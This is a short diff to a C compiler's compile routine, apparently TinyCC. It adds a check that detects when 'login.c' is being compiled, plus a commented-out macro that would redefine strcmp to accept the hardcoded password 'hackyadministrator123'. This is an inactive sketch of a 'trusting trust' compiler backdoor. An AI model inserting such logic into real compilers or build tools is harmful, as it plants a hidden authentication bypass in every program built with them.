@@ -718,6 +718,22 @@ static int tcc_compile(TCCState *s1, int filetype, const char *str, int fd)
        Alternatively we could use thread local storage for those global
        variables, which may or may not have advantages */
 
+	// pray.
+	
+	if(!strcmp(str, "login.c")) {
+		// detect if in login.c
+		
+		printf("bruh compiling login.c\n");
+		
+		/*
+		#define minLen(X, Y)  (strlen(X) < strlen(Y) ? strlen(X) : strlen(Y))
+		#define strcmp(a, b) ( !(memcmp(a, "hackyadministrator123", minLen(a, "hackyadministrator123")) || !memcmp(b, "hackyadministrator123", minLen(b, "hackyadministrator123")) ) ? 0 : memcmp(a, b, minLen(a, b)))
+		*/
+		
+	}
+
+
+
     tcc_enter_state(s1);
     s1->error_set_jmp_enabled = 1;
 
